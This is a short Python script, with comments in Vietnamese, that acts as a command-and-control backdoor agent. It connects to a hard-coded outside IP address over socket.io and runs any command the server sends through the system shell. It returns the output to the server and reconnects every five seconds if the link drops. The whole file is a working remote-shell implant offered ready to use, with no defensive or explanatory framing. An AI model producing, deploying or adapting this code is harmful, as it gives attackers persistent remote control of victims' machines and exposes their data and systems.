import socketio
import subprocess
import time

sio = socketio.Client()

# IP VPS của bạn đã được điền sẵn
C2_SERVER_URL = 'http://170.64.229.9:3000'

@sio.event
def connect():
    print("[+] Đã kết nối tới Trạm Chỉ Huy!")

@sio.on('execute_cmd')
def on_message(command):
    try:
        # Chạy lệnh thẳng vào hệ thống
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
        sio.emit('cmd_result', f"Thành công: {result[:500]}") 
    except subprocess.CalledProcessError as e:
        sio.emit('cmd_result', f"Lỗi: {e.output[:500]}")

if __name__ == '__main__':
    while True:
        try:
            sio.connect(C2_SERVER_URL)
            sio.wait()
        except Exception as e:
            time.sleep(5)
